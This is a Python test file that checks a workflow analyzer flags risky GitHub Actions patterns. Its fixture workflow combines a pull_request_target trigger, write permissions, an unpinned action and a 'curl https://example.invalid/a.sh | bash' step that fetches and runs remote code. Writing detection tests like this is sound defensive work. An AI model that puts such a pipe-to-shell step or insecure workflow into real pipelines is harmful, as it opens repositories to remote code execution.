from guardian.workflow import analyze_workflow


def test_detects_dangerous_workflow_patterns():
    content = """permissions:
  contents: write
  pull-requests: write
on:
  pull_request_target:
    types: [opened]
jobs:
  x:
    steps:
      - uses: actions/checkout@main
      - run: curl https://example.invalid/a.sh | bash
"""
    findings = analyze_workflow(".github/workflows/test.yml", content)
    ids = {item["id"] for item in findings}
    assert "workflow-pull-request-target" in ids
    assert "workflow-pr-write" in ids
    assert "workflow-pipe-shell" in ids
    assert "workflow-unpinned-action" in ids
